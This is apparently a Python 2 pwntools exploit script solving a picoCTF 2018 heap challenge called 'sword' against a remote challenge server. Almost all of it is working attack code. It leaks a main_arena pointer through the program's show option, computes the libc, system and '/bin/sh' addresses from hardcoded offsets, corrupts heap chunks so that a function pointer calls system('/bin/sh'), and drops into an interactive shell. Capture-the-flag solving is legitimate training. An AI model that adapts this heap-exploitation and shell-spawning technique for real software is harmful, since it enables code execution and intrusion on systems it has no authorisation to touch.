from  pwn import *

def add(s):
	s.sendline("1")
	print s.recvuntil("7. Quit.\n")

#vuln
def synt(s,index1,index2): 
	s.sendline("2")
	s.sendline(str(index1)) #first chunk
	s.sendline(str(index2)) #second chunk
	print s.recvuntil("7. Quit.\n")

def show(s,index):
	s.sendline("3")
	s.sendline(str(index)) #index to show
	print s.recvuntil("The name is")
	data = s.recv(7) #name content
	leak = u64(data[1::].ljust(8,"\x00"))
	return leak
def delete(s,index):
	s.sendline("4")
	s.sendline(str(index)) #index to delete
	print s.recvuntil("7. Quit.\n")

def harden(s,index,name_len,name):
	s.sendline("5")
	s.sendline(str(index)) #index
	s.sendline(str(name_len)) #size
	s.sendline(name) #name
	s.sendline("-1") #weight
	print s.recvuntil("7. Quit.\n")

#system("/bin/sh")
def equip(s,index):
	s.sendline("6")
	s.sendline(str(index))
	s.interactive()

#s = process('./sword')
s = remote("2018shell2.picoctf.com", 32987)
pause()
print s.recvuntil("7. Quit.\n")
add(s)
add(s)
harden(s,0,0x99,"D"*32 ) 
synt(s,0,1)
main_arena = show(s,0)
print "main_arena is at : ",hex(main_arena)
system_offset = 3667944
system_libc = main_arena - system_offset
libc_base = system_libc - 0x0000000000045390
bin_sh_libc = system_libc + 0x1479c7
print "[+] System_libc is at ",hex(system_libc)
print "[+] libc_base is at ",hex(libc_base)
print "[+] Bin_sh is at : ",hex(bin_sh_libc)
delete(s,1)
add(s) #1
add(s) #2 ==> 0
add(s) #3
add(s) #4
harden(s,3,0x99,p64(bin_sh_libc)*2+p64(system_libc)) #p64(system_libc))
synt(s,3,4)
delete(s,4)
s.interactive()
#add(s)
harden(s,4,0x99,"K"*0x99)
add(s) #5 ==>3
equip(s,5)

#s.interactive()

